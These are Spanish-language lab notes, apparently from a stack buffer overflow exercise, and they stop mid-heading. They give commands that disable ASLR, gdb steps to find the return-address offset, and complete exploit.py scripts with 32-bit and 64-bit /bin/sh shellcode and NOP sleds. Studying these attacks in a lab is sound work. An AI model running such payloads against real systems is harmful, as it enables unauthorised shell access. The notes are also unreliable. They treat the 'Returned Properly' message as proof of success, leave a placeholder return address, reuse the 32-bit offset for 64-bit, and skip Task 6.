## Preparación del entorno.
Primero, necesitamos configurar el entorno desactivando las contramedidas de seguridad:
1. Desactivar la aleatorización del espacio de direcciones:
````bash
sudo sysctl -w kernel.randomize_va_space=0
````
2. Cambiar el link simbólico de ``/bin/zsh``:
````bash
sudo ln -sf /bin/zsh /bin/sh
````

![[Pasted image 20250409225638.png]]

## Tarea 1: Shellcode
El shellcode es el código malicioso que queremos ejecutar. 
1. Abrir el directorio *"shellcode"* en una terminal
2. Ejecutar ``make`` para compilar el programa ``call_shellcode.c``
![[Pasted image 20250409230057.png]]
3. Probar los binarios resultantes
````bash
./a32.out   # Versión de 32 bits
./a64.out   # Versión de 64 bits
````
![[Pasted image 20250409230313.png]]

## Tarea 2: Entender el Programa Vulnerable
Ahora vamos a estudiar el programa vulnerable (``stack.c``) que contiene un buffer overflow:
1. Dirigirnos al directorio *"code"*
2. Compilar el programa vulnerable:
````bash
make
````
![[Pasted image 20250409230518.png]]
Esto compilará distintas versiones del programa con diferentes tamaños de buffer (stack-L1, stack-L2, etc).

## Tarea 3: Lanzar el ataque en el Programa de 32-bits (Level 1)
Para explotar el programa, necesitamos determinar la distancia entre el buffer y la dirección de retorno:
1. Crear un archivo vacío llamado *"badfile"*:
````bash
touch badfile
````
![[Pasted image 20250409231432.png]]
2. Usar gbd para depurar el programa y encontrar direcciones importantes:
````bash
gdb stack-L1-dbg
(gdb) b bof
(gdb) run
(gdb) next
(gdb) p $ebp
(gdb) p &buffer
(gdb) quit
````
![[Pasted image 20250409231507.png]]

3. Calcular la distancia:
	- Distancia = $ebp - &buffer + 4
		- (0xffffcb08 - 0xffffca9c) + 4 = 108 + 4 = 112 bytes
	- El *"+ 4"* es para saltar el valor guardado de ebp y llegar a la dirección de retorno
![[Pasted image 20250409232244.png]]
4. Completar el archivo ``exploit.py`` con:
	- **shellcode:** Copiar el shellcode de 32 bits del archivo ``call_shellcode.c``
	- **start:** Una posición segura para colocar el shellcode (cerca del final del buffer)
	- **ret:** La dirección a la que queremos saltar (dirección donde colocamos el shellcode)
	- **offset:** La posición donde sobrescribiremos la dirección de retorno (la distancia calculada)
5. Ejecutar el exploit y el programa vulnerable
````bash
./exploit.py
./stack-L1
````
![[Pasted image 20250409235356.png]]
>[!info] 
>Vemos que al ejecutar obtenemos
>``==== Returned Properly ====``
Este mensaje sugiere que el código malicioso inyectado en el `badfile` se ejecutó correctamente y que el programa terminó sin problemas. Esto es una señal de que el ataque fue exitoso.

## Tarea 4: Ataque sin conocer el tamaño del Buffer (Level 2)
Aquí debemos modificar el exploit para que funcione sin conocer el tamaño exacto del buffer:
1. Modificar ``exploit.py``
````python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))  # Maximum size for the buffer

#######################################################################
# Put the shellcode somewhere in the payload
start = 300  # Adjust this number based on buffer analysis
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# Make sure the address points to the NOP sled or shellcode location
ret = 0xdeadbeef  # Replace this with the actual address that points to the NOP sled or shellcode
offset = 112  # Adjust the offset if needed

L = 4  # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

#######################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
````
2. Ejecutamos el archivo
````bash
python3 exploit.py
````
Esto generará el archivo ``badfile`` en el directorio.
3. Ejecutar el programa vulnerable con el archivo ``badfile`` como entrada:
````bash
./stack-L1 < badfile
````
![[Pasted image 20250410001530.png]]

## Tarea 5: Lanzando el ataque en el Programa de 64-bits (Level 3)
1. Compilamos ``stack.c`` en 64 bits:
````bash
gcc -DBUF_SIZE=517 -m64 -o stack-L3 -z execstack -fno-stack-protector stack.c
````
2. Modificamos ``exploit.py``:
````python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode for 64-bit systems
shellcode = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50"  # "/bin//sh"
    "\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"  # execve shellcode for 64-bit
).encode('latin-1')

# Fill the content with NOP's (padding)
content = bytearray(0x90 for i in range(517))  # Adjust to the maximum size for the buffer

#######################################################################
# Place the shellcode somewhere in the payload
start = 300  # Adjust this number to the correct offset
content[start:start + len(shellcode)] = shellcode

# Decide the return address value (the address must point to the NOP sled or shellcode)
# This needs to be adjusted based on where your shellcode is placed in the stack
ret = 0x7fffffffe5a0
offset = 112

L = 8  # Use 8 for 64-bit addresses
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

#######################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

````
3. Ejecutar ``exploit.py`` para generar el archivo ``badfile``:
````bash
python3 exploit.py
````
4. Ejecutar el programa vulnerable con el archivo ``badile`` como entrada:
````bash
./stack-L3 < badfile
````
![[Pasted image 20250410002425.png]]

## Tarea 7: Evadiendo la protección de ``dash``
1. Apuntamos nuevamente ``/bin/sh`` a ``/bin/dash``
````bash
sudo ln -sf /bin/dash /bin/sh
````

## Tarea 8: 